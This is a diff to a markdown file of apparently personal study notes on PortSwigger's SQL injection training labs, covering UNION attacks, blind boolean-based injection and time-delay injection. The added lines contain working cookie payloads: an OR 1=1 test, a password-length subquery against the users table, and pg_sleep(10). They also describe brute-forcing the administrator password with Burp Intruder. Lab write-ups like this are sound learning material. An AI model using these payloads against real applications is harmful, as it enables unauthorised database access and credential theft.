@@ -8,9 +8,9 @@ Details at [here](https://portswigger.net/web-security/sql-injection)
 
 Type of SQL injection in example
 
-- Retrieving hidden data
-- UNION attacks
-- Blind SQL injection
+- [Retrieving hidden data](#retrieving-hidden-data)
+- [UNION attacks](#union-attacks)
+- [Blind SQL injection](#blind-sql-injection)
 
 ## Retrieving hidden data
 
@@ -110,5 +110,31 @@ The final payload is: `' UNION SELECT USERNAME_ETTQUM, PASSWORD_EVVZCC FROM USER
 
 [Lab 11](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)
 
-Description of this lab: The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.
+Description of this lab: The results of the SQL query are not returned, and no error messages are displayed. But the application includes a **Welcome back** message in the page if the query returns any rows. The application uses a tracking **cookie** for analytics, and performs an SQL query containing the value of the submitted cookie.   
+
+The database contains a different table called **users**, with columns called **username and password**, find out the password of the administrator user.
+
+So we need modify cookie, when we use burpsuite, and open page, we will get cookie like this: `Cookie: TrackingId=78FpD4ERhK86IMIp; session=cjruWYG4ZqnnopctvKK3e3DJS2nN8eM2`. 
+
+If we modify session, the website will be loss data of this session, so we will modify TrackingID `Cookie: TrackingId=78FpD4ERhK86IMIp+'+or+1=1--; session=cjruWYG4ZqnnopctvKK3e3DJS2nN8eM2`, and return page including 'Welcome back', so it is right direction. Only thing we can do is making condition. At the first, determine the length of password `Cookie: TrackingId=78FpD4ERhK86IMIp+'or+(SELECT+LENGTH(password)+FROM+users+WHERE+username='administrator')=20--; session=cjruWYG4ZqnnopctvKK3e3DJS2nN8eM2`
+
+Note: using burp intruder for bruting force value in condition 
+
+Nextly, using brute force to guess 20-length password
+
+[Lab 12](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)
+
+[Lab 13](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays)
+
+Description of this lab: exploit the SQL injection vulnerability to cause a 10 second delay.
+
+Using payload similar `Cookie: TrackingId=nTjOlcnGoesLH7fd+'or+pg_sleep(10)--; session=8BYemkFDFxWMOkX21X7uPWmJ0P1fAYRl` to sleep in 10 second, then solved the lab.
+
+[Lab 14](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)
+
+
+
+
+
+
 
